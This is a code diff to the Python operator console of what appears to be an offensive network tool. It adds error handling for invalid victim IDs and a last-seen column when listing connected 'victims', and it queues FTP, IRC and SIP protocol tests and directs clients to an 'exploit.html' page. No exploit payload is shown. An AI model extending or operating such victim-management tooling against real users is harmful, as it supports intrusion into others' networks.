@@ -41,7 +41,14 @@ class Shell():
 					return []
 	def getVictimById(self,id):
 		victims = self.getVictims()
-		return victims[id]
+		if victims != None:
+			try:
+				result = victims[id]
+			except IndexError:
+				result = None #invalid list index
+		else:	
+			result = None
+		return result
 	############################################################################
 	def handleCMD_help(self,parts):
 		if len(parts)==1:
@@ -86,13 +93,16 @@ class Shell():
 			ip = args[3]
 			port = args[4]
 			victim = self.getVictimById(vic_id)
-			if proto != "ALL":
-				victim.TESTS.append(proto + " " +  ip + " " + str(port))
+			if victim == None: 
+				print "You provided an invalid client id, type 'list clients' for a list of available clients."
 			else:
-				#run all proto tests
-				victim.TESTS.append("FTP " +  ip + " " + str(port))
-				victim.TESTS.append("IRC " +  ip + " " + str(port))
-				victim.TESTS.append("SIP " +  ip + " " + str(port))
+				if proto != "ALL":
+					victim.TESTS.append(proto + " " +  ip + " " + str(port))
+				else:
+					#run all proto tests
+					victim.TESTS.append("FTP " +  ip + " " + str(port))
+					victim.TESTS.append("IRC " +  ip + " " + str(port))
+					victim.TESTS.append("SIP " +  ip + " " + str(port))
 	def handleCmd_list(self, item):
 		if item.upper()=="CLIENTS":
 			victims = self.getVictims() # refresh list
@@ -103,7 +113,8 @@ class Shell():
 				print "No clients connected yet: point them to http://yourserver/exploit.html?type=cmd&ci=ip-of-client"
 			else:
 				for victim in victims:
-					print "   " + str(x) + ".   " + victim.VIC_ID + "\t\t" + victim.PUBLIC_IP
+					lastseen = datetime.now()-victim.LAST_SEEN
+					print "   " + str(x) + ".   " + victim.VIC_ID + "\t\t" + victim.PUBLIC_IP + "\t\t" + str(lastseen.seconds)
 					x=x+1
 		elif item.upper() =="SERVICES":
 			print "Currently running services:"
